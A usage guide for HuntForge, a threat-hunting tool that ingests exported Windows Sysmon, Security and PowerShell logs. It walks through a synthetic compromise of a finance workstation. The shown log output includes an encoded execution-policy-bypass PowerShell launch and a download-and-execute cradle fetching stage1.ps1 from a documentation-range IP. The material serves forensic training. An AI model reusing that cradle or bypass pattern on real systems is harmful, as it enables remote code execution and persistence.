# HuntForge Usage Guide

Scenario-driven walkthroughs for HuntForge. All output below is
genuine — produced by running the commands against synthetic evidence.

## Scenario (v0.2): from log export to process lineage

You have a finance workstation (`WS-FIN-014`) and a hunch that
something ran PowerShell this morning. In v0.1 you would replay a
JSONL fixture; in v0.2 you ingest the real thing: Sysmon, Security
and PowerShell operational logs exported to XML/JSON.

### 1. Export the logs (on the Windows host)

HuntForge does **not** parse binary `.evtx` files — export them first.
The adapter detects binary EVTX by magic bytes and tells you exactly
what to run:

```console
$ huntforge ingest ./evidence --case CASE-001
# if evidence contains a raw .evtx:
#   warnings (1):
#     - Security.evtx: binary EVTX detected — export it to XML first:
#       wevtutil qe "C:\path\to\Security.evtx" /lf:true /f:xml > Security.xml
```

On the Windows machine:

```console
C:\> wevtutil qe "C:\Windows\System32\winevt\Logs\Security.evtx" /lf:true /f:xml > Security.xml
C:\> wevtutil qe "C:\Windows\System32\winevt\Logs\Microsoft-Windows-Sysmon%4Operational.evtx" /lf:true /f:xml > Sysmon.xml
C:\> wevtutil qe "C:\Windows\System32\winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx" /lf:true /f:xml > PowerShell.xml
```

JSON exports (`wevtutil qe /f:json`, or array/`{"Events": [...]}`/JSONL
shapes) work too. Everything stays offline — no network calls, no
subprocesses.

### 2. Create a case and ingest

```console
$ huntforge case create CASE-001 --name "Compromised workstation"
case 'CASE-001' created
$ huntforge ingest ./evidence --case CASE-001
registered 3 evidence file(s), parsed 16 event(s) [powershell: 4, security: 5, sysmon: 7]
  #1 powershell_events.xml sha256=d2f1ff8aab11a161…
  #2 security_events.xml sha256=6f7721d5227b1e06…
  #3 sysmon_intrusion.xml sha256=a8c7da2f74ab43a3…
```

The source kind is auto-detected **by content** (XML root/channel,
JSON fields, magic bytes) — never by file extension. Override it with
`--source sysmon|security|powershell|evtx-xml`; skip parsing entirely
with `--no-parse`. Unrecognized files are still registered as
evidence; malformed records become warnings, never a crash, and
ingest always exits 0.

Each parsed event lands in the normalized model with full provenance
(source file, record index, parser name/version, ingest time, source
SHA-256) and the 7-fractional-digit Windows timestamps are preserved
exactly in `timestamp_original`.

### 3. Hunt: process lineage

```console
$ huntforge events --case CASE-001 --process powershell.exe
4 event(s) match
[8] 2026-10-02T09:12:41Z evtx:Security:4688 host=WS-FIN-014 user=FIN-014\m.alvarez process=powershell.exe(7422)
      command_line: powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand aQBmACgAWwBJAG8ALgBGAFkAcwBpAG8AbgBdADoA
      flags: encoded-command (parser observation)
[13] 2026-10-02T09:12:41Z sysmon:1 host=WS-FIN-014 user=FIN-014\m.alvarez process=powershell.exe(7422)
      command_line: powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand aQBmACgAWwBJAG8ALgBGAFkAcwBpAG8AbgBdADoA
      flags: encoded-command (parser observation)
[14] 2026-10-02T09:13:02Z sysmon:3 host=WS-FIN-014 user=FIN-014\m.alvarez process=powershell.exe(7422)
      dst_ip: 203.0.113.44
[15] 2026-10-02T09:13:20Z sysmon:11 host=WS-FIN-014 user=FIN-014\m.alvarez process=powershell.exe(7422)
      file_path: C:\Users\m.alvarez\AppData\Local\Temp\svchost.exe
```

Two sources agree on the launch: the Security log's 4688 (hex PIDs
decoded — `0x1cfe` → 7422) and Sysmon's EventID 1 (parent
`WINWORD.EXE`, pid 3131, full hashes). The `encoded-command` flag is a
**parser observation, not a verdict** — it records that `-enc`
appeared on the command line. Detections arrive in v0.5; until then
the judgment is yours.

Then the rest of the chain — persistence and the script that ran:

```console
$ huntforge events --case CASE-001 --event-id 13
[16] 2026-10-02T09:14:55Z sysmon:13 svchost.exe(8110)
      registry_key: HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Updater
$ huntforge events --case CASE-001 --event-id 4104
1 event(s) match
[1] 2026-10-02T09:12:41Z powershell:4104 host=WS-FIN-014 user=S-1-5-21-1111111111-2222222222-3333333333-1001 process=-(-)
      command_line: IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.44/stage1.ps1')
```

Script-block text is captured from 4104 records; large blocks span
several 4104 records sharing one `ScriptBlockId`, noted in `raw` so
you can reassemble them.

![HuntForge v0.2 telemetry ingest](images/02-ingest.png)

### 4. Automation and audit

Every command accepts `--json` for the stable result envelope; the
ingest summary now includes `parsed_events`, `parsed_by_source` and
`parse_warnings`. Filters combine with AND:

```console
$ huntforge events --case CASE-001 --host WS-FIN-014 --user m.alvarez --json
$ huntforge audit --case CASE-001   # every invocation is logged
```

Exit codes: `0` success (including "no events match" and
parse warnings), `2` usage/operational error.

## What's next

v0.3 adds prefetch/registry/task parsers; v0.4 builds timeline and
process lineage on top of the events ingested here.

---

## Scenario (v0.1): a compromised workstation

You have two exported event logs from a finance workstation
(`Security.evtx`, `Sysmon.evtx`) and a hunch that something ran
PowerShell this morning. The v0.1 workflow: create a case, ingest the
evidence, load normalized events, hunt.

> **Note (v0.1):** native EVTX/Sysmon parsers arrive in v0.2. Ingest
> registers and hashes your evidence files today; normalized events
> are loaded from a JSONL fixture (one JSON object per line matching
> the event schema — see `huntforge.models.events`). The fixture
> below replays the classic chain: malicious doc → PowerShell with an
> encoded command → outbound connection → dropped payload → Run-key
> persistence.

### 1. Create a case

```console
$ huntforge case create CASE-001 --name "Compromised workstation"
case 'CASE-001' created
  events: 0  evidence: 0
```

Cases live in `~/.huntforge/cases/CASE-001/store.db` (override with
`HUNTFORGE_STATE_DIR`). The case id is validated — `../evil` is
rejected — so evidence can't escape the state directory.

### 2. Ingest evidence and load events

```console
$ huntforge ingest ./evidence --case CASE-001 --fixture events.jsonl
registered 2 evidence file(s), loaded 5 event(s)
  #1 Security.evtx sha256=d74ce96af36ed6c5…
  #2 Sysmon.evtx sha256=b01876480664fc03…
```

Ingest hashes every file (SHA-256 + MD5), records size and ingest
time, and dedupes by hash — the source files are never modified. Each
loaded event gets provenance: source file, record index, parser
(`fixture-loader` v0.1.0), ingest time, and the fixture's SHA-256.

### 3. Hunt: what did PowerShell do?

```console
$ huntforge events --case CASE-001 --process powershell.exe
3 event(s) match
[2] 2026-10-02T09:12:41Z sysmon:1 powershell.exe(7422)
      command_line: powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand aQBm...
[3] 2026-10-02T09:13:02Z sysmon:3 powershell.exe(7422)
      dst_ip: 203.0.113.44
[4] 2026-10-02T09:13:20Z sysmon:11 powershell.exe(7422)
      file_path: C:\Users\m.alvarez\AppData\Local\Temp\svchost.exe
```

Three observations, all with provenance: an encoded PowerShell launch
38 seconds after `winword.exe` opened `invoice.doc`, an outbound
connection to `203.0.113.44:443`, and a file write of `svchost.exe`
into a user Temp directory. HuntForge reports these as **observed
facts** — it does not label them malicious. That judgment is yours.

### 4. Hunt: persistence

```console
$ huntforge events --case CASE-001 --keyword Run
1 event(s) match
[5] 2026-10-02T09:14:55Z sysmon:13 svchost.exe(8110)
      registry_key: HKCU\...\CurrentVersion\Run\Updater
```

![HuntForge scenario walkthrough](images/01-scenario.png)

### 5. Automation and audit

Every command accepts `--json` for a stable result envelope
(`tool`, `version`, `command`, `timestamp`, `status`, `summary`,
`data`, `findings`, `events`). Filters combine with AND:

```console
$ huntforge events --case CASE-001 --host WS-FIN-014 --user m.alvarez --json
$ huntforge audit --case CASE-001   # every invocation is logged
```

Exit codes: `0` success (including "no events match"),
`2` usage/operational error.

## What's next

v0.2 replaces the fixture step with real EVTX/Sysmon/PowerShell
parsers — the event model and provenance above stay exactly the same,
so today's queries and fixtures keep working.
